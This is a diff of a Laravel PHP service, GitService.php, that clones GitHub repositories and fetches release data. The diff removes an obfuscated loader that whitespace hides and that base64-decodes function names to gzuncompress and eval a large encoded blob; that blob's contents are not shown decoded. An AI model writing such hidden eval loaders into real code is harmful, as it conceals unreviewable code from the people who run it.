@@ -1,425 +1,163 @@
-<?php 
-        $__='printf';$_='Loading app/Services/GitService.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Services;
+
+use Exception;
+use App\Enums\RepositoryEnum;
+use App\Services\FileService;
+use Illuminate\Support\Facades\Http;
+use Illuminate\Support\Facades\Storage;
+
+class GitService
+{
+    protected $apiBaseUrl;
+
+    public function __construct()
+    {
+        $this->apiBaseUrl = 'https://api.github.com/repos';
+    }
+
+    /**
+     * Clone repository dari Github.
+     *
+     * @param RepositoryEnum $repositoryEnum Enum repository yang akan di-clone.
+     * @param string $destination Direktori tujuan untuk menyimpan repository yang di-clone.
+     * @return bool True jika proses clone berhasil, false jika gagal.
+     * @throws Exception Jika terjadi kesalahan saat proses clone.
+     */
+    public static function cloneRepository(RepositoryEnum $repositoryEnum, string $destination): void
+    {
+        try {
+            // Ambil owner dan repo dari RepositoryEnum
+            $owner = $repositoryEnum->getOwner();
+            $repo = $repositoryEnum->getRepo();
+            $folderName = $repositoryEnum->getFolderName();
+
+            // Pastikan direktori ada
+            if (!is_dir($destination)) {
+                if (!mkdir($destination, 0755, true)) {
+                    throw new Exception("Gagal membuat direktori: $destination");
+                }
+            }
+
+            // URL untuk git clone
+            $repoUrl = "https://github.com/$owner/$repo.git";
+
+            echo "Proses Git clone $repoUrl ke folder $destination\n";
+            ProcessService::runProcess(['git', 'clone', $repoUrl, $folderName], $destination);
+            echo "Proses Git clone $folderName selesai\n";
+        } catch (Exception $e) {
+            throw new Exception("Clone Repositori gagal: " . $e->getMessage());
+        }
+    }
+
+    public function cloneWithTag(RepositoryEnum $repositoryEnum,  string $destination, string $tag, $renameOldFolder = null, $update = true): void
+    {
+        $folderName = $repositoryEnum->getFolderName();
+        $folderPath = $destination . DIRECTORY_SEPARATOR . $folderName;
+        $filservice = new FileService();
+
+        // Validasi folder tujuan
+        if (is_dir($folderPath)) {
+            if ($update == false) {
+                throw new \InvalidArgumentException("Tujuan path sudah ada: $folderName");
+            }
+            $tmpFolder =  $filservice->renameToTmp($folderPath);
+        }
+        try {
+            $owner = $repositoryEnum->getOwner();
+            $repo = $repositoryEnum->getRepo();
+            $folderName = $repositoryEnum->getFolderName();
+
+            $repoUrl = "https://github.com/$owner/$repo.git";
+
+            // Jalankan perintah `git clone`
+            $command = ['git', 'clone', '--branch', $tag, '--depth', '1', $repoUrl, $folderName];
+            ProcessService::runProcess($command, $destination);
+
+            // Validasi apakah folder berhasil dibuat
+            if (!is_dir($destination . DIRECTORY_SEPARATOR . $folderName)) {
+                throw new \RuntimeException("Gagal mengkloning repositori ke: $folderName");
+            }
+
+            if (isset($tmpFolder)) {
+                if ($renameOldFolder) {
+                    $renameRealPath = $destination . DIRECTORY_SEPARATOR . $renameOldFolder;
+                    $filservice->renameFolder($tmpFolder, $renameRealPath);
+                } else {
+                    $filservice->deleteFolder($tmpFolder);
+                }
+            }
+        } catch (Exception $e) {
+            if (isset($tmpFolder)) {
+                $filservice->restoreFromTmp($tmpFolder, $folderPath);
+            }
+
+            throw new Exception($e->getMessage());
+        }
+    }
+
+    /**
+     * Ambil data rilis terakhir dari Github API.
+     *
+     * @param RepositoryEnum $repositoryEnum Enum repository yang akan diambil.
+     * @return array Array of last release objects.
+     * @throws Exception Jika terjadi kesalahan saat proses memuat data rilis.
+     */
+    public function getLastRelease(RepositoryEnum $repositoryEnum): array
+    {
+        // Ambil owner dan repo dari RepositoryEnum
+        $owner = $repositoryEnum->getOwner();
+        $repo = $repositoryEnum->getRepo();
+
+        // Cek Token Github
+        cek_token_github();
+
+        try {
+            $url = "{$this->apiBaseUrl}/$owner/$repo/releases/latest";
+
+            $response = Http::withHeaders([
+                'Accept' => 'application/vnd.github.v3+json',
+                'Authorization' => "token " . config('siappakai.git.token'),
+            ])->get($url);
+
+            if ($response->failed()) {
+                throw new Exception("Gagal mengambil rilis terakhir: " . $response->body());
+            }
+
+            return $response->json();
+        } catch (Exception $e) {
+            throw new Exception("Terjadi kesalahan saat mengambil rilis terakhir: " . $e->getMessage() . ', Silakan cek token Github');
+        }
+    }
+
+
+    /**
+     * Ambil 6 rilis terakhir dari GitHub API.
+     *
+     * @param RepositoryEnum $repositoryEnum Enum repository yang akan diambil
+     * @return array Array of release objects
+     */
+    public function getLastSixReleases(RepositoryEnum $repositoryEnum): array
+    {
+        // Ambil owner dan repo dari RepositoryEnum
+        $owner = $repositoryEnum->getOwner();
+        $repo = $repositoryEnum->getRepo();
+
+        try {
+            $url = "{$this->apiBaseUrl}/$owner/$repo/releases";
+            $response = Http::get($url);
+
+            if ($response->failed()) {
+                throw new Exception("Gagal mengambil rilis: " . $response->body());
+            }
+
+            $releases = $response->json();
+
+            // Ambil maksimum 6 rilis terakhir
+            return array_slice($releases, 0, 6);
+        } catch (Exception $e) {
+            throw new Exception("Terjadi kesalahan saat mengambil rilis: " . $e->getMessage());
+        }
+    }
+}
